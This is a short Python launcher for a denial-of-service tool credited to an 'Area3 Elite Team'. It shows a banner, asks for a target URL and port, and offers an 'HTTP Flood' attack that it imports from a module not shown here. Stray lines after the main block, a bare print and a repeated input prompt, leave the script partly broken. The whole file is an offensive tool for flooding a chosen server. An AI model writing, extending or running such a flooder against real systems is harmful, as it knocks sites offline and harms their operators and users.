#!/usr/bin/env python3
from sys import exit, version_info
from urllib.parse import urlparse
import socket
import os

if version_info < (3,):
  raise RuntimeError('You need to run Python 3')

def main():
	print("     _    _   _  __    ___ ____  ")
	print("    / \  | \ | |/ /_  / _ \___ \ ")
	print("   / _ \ |  \| | '_ \| | | |__) |")
	print("  / ___ \| |\  | (_) | |_| / __/ ")
	print(" /_/   \_\_| \_|\___/ \___/_____|")
	print("\nDeveloped by Vir - Area3 Elite Team")
	raw = input("Enter your target: ")
	parsed = urlparse(raw)
	if not parsed.netloc:
		raise RuntimeError('You need to input the valid URL!')
	port = int(input("Enter port: "))
	try:
		ip = socket.gethostbyname(parsed.netloc)
	except:
		raise RuntimeError("Can't resolve this domain")
	# Clear the screen
	os.system('cls' if os.name == 'nt' else 'clear')

	print("1. HTTP Flood")
	choice = int(input("Select your attack vector: "))
	if choice == 1:
		from modules import HTTPFlood
		HTTPFlood(parsed.netloc, port)

if __name__ == '__main__':
    main()












	


	

	print



raw = input("Select your attack vector: ")





